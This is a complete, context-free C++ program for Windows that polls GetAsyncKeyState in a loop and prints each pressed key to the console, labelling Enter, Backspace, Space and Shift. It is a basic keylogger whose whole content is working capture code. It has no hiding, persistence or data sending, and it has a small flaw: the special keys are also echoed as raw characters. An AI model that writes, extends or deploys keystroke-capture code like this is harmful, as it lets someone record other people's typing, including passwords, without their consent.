#include <windows.h>
#include <iostream>

int main() {
    while (true) {
        for (int ch = 8; ch <= 255; ch++) {
            if (GetAsyncKeyState(ch) & 0x8000) {
                if (ch == VK_RETURN) std::cout << "{ENTER}" << std::endl;
                else if (ch == VK_BACK) std::cout << "{BACKSPACE}" << std::endl;
                else if (ch == VK_SPACE) std::cout << "{SPACE}" << std::endl;
                else if (ch == VK_SHIFT) std::cout << "{SHIFT}" << std::endl;
                std::cout << char(ch) << std::endl;
            }
        }
        Sleep(50);
    }
    return 0;
}